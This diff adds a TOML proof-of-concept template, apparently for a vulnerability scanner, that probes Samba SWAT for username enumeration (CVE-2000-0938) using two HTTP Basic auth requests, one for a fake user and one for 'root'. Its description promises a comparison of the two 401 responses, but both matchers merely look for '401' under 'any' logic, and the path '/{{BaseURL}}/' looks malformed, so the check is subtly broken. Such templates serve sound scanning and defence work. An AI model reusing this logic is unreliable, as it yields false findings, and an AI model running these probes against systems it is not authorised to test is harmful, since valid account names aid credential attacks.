@@ -1,0 +1,47 @@
+[info]
+author = "AVE"
+description = "通过向 Samba SWAT 发送带有不同用户名的 HTTP Basic 认证请求，对比返回的 401 响应内容差异，判断是否存在有效用户名枚举漏洞。若有效用户名与无效用户名返回不同错误信息，则判定存在漏洞。"
+id = "POC-AVE-2000-1020"
+name = "Samba SWAT 用户名枚举漏洞 PoC"
+severity = "medium"
+tags = [
+    "cve-2000-0938",
+    "samba",
+    "swat",
+    "username-enumeration",
+]
+vuln_id = [
+    "CVE-2000-0938",
+    "AVE-2000-1020",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "Basic bm9zdWNoZXVzZXIxMjM0Om5vcGFzcw=="
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["401"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "Basic cm9vdDpub3Bhc3M="
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["401"]
